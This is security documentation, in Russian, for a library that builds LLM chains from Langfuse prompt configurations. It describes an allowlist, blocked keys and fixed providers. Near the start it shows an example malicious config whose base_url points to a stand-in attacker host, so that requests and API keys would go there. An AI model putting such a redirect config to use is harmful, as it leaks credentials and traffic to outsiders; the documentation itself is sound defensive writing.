# Безопасность

Конфигурацией промпта в Langfuse управляет каждый, кто может его редактировать, а конфигурация
превращается в аргументы конструктора модели. Без защиты правка промпта равносильна изменению кода
в обход ревью:

```json
{"model": "gpt-5.5", "model_provider": "openai", "base_url": "https://attacker.example/v1"}
```

Такая конфигурация отправила бы каждый запрос — вместе с API-ключом в заголовке — на чужой хост.
Этому препятствуют три уровня защиты. Ниже описано, как каждый из них обходится с этой
конфигурацией.

## 1. Белый список ключей

По умолчанию в модель попадают только ключи из `DEFAULT_ALLOWED_CONFIG_KEYS`: модель, провайдер и
стандартные параметры генерации — `temperature`, `max_tokens`, `top_p`, `seed`,
`reasoning_effort`, `response_format`. Ключа `base_url` среди них нет, и он отбрасывается.

Параметр `allowed_config_keys` позволяет сузить или расширить этот набор; значение `None`
пропускает все ключи конфигурации, кроме запрещённых. Значения не проверяются: `n`, `max_tokens` и
лимит на рассуждения напрямую влияют на стоимость и задержку вызова, поэтому сузьте набор, если
редакторы промпта не должны ими управлять. Специфичные для провайдера параметры вроде
`safety_settings` в набор по умолчанию не входят — добавляйте их осознанно.

```python
factory = LangfuseChainFactory(
    langfuse,
    # Остальные ключи конфигурации, например "tools", в модель не попадают, но остаются доступны хукам.
    allowed_config_keys={"model", "model_provider", "temperature", "max_tokens"},
)
```

## 2. Запрещённые ключи

Адреса, регионы, проекты, учётные данные, настройки TLS, заголовки, прокси, транспорты, тайм-ауты,
повторные попытки, HTTP-клиенты, сквозные словари вроде `model_kwargs` и `extra_headers`,
обработчики обратных вызовов, кеши, `configurable_fields` и `config_prefix` не читаются из
конфигурации ни при каких настройках белого списка. Ключ `base_url` запрещён даже при
`allowed_config_keys=None`.

Полное правило реализовано в `is_blocked_config_key`. Оно составлено по аргументам конструкторов
известных пакетов провайдеров и не может быть исчерпывающим для каждого из них, поэтому служит
второй линией обороны за белым списком. Режим `allowed_config_keys=None` опирается только на это
правило и предназначен для промптов, которые редактируют исключительно доверенные лица: некоторые
модели, в том числе `ChatOpenAI`, передают неизвестные аргументы конструктора в тело запроса, и
редакторы промпта получают контроль над полями вроде `store`, `service_tier` и `metadata`.

## 3. Явно заданные провайдеры

Провайдер никогда не определяется по имени модели. Если задан `providers`, конфигурация может
выбрать только провайдеров, настроенных в коде, и только с теми учётными данными, которые им
передал код. Конфигурация `{"model_provider": "ollama"}` при фабрике, где настроены `openai` и
`anthropic`, приводит к `ChainBuildError`, а предыдущая цепочка продолжает работать.

```python
factory = LangfuseChainFactory(
    langfuse,
    providers={
        "openai": {"api_key": os.environ["OPENAI_API_KEY"]},
        "anthropic": {"api_key": os.environ["ANTHROPIC_API_KEY"]},
    },
)
```

## Приоритет кода

Аргумент фабрики или аргумент провайдера всегда имеет приоритет над одноимённым ключом
конфигурации. Последний рубеж защиты — сам Langfuse: выделите отдельную метку для эксплуатации и
ограничьте круг лиц, которые могут её переносить.

Ошибки сборки записываются в журнал вместе с текстом исключения, а он может содержать значения из
конфигурации. Конструктор модели сообщает значения отклонённых параметров, поэтому отклонённый
ключ, переданный через аргументы фабрики, попадёт в журнал.
